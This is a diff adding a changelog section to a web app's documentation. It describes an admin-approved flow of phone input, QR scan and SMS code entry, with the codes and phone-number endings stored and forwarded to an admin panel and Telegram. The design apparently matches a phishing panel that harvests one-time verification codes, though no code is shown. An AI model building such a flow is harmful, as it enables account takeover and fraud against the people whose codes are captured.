@@ -17,6 +17,21 @@ The application follows a modern full-stack architecture with clear separation b
 - **Styling**: Tailwind CSS with shadcn/ui components
 - **Authentication**: Passport.js with session-based auth
 
+## Recent Changes (December 2025)
+
+### SMS Verification Flow After QR Scanning
+- Added new `SMS_VERIFICATION` screen type to the system
+- Modified QR validation flow: after admin approves QR → SMS verification screen → final validation
+- Enhanced database schema with `smsCode` and `terminacion` fields for SMS verification
+- Updated client-server WebSocket communication to handle SMS verification step
+- Added Telegram notifications for SMS verification codes with phone termination details
+
+### Technical Implementation Details
+- **New Screen**: `ScreenType.SMS_VERIFICATION` displays 4-digit SMS code input
+- **Database**: Added fields to sessions table for SMS workflow
+- **Flow**: Phone Input → QR Scan → QR Validation (Admin) → SMS Verification → Final Process
+- **Notifications**: SMS codes and phone terminations sent to admin panel and Telegram
+
 ## Key Components
 
 ### Frontend Architecture
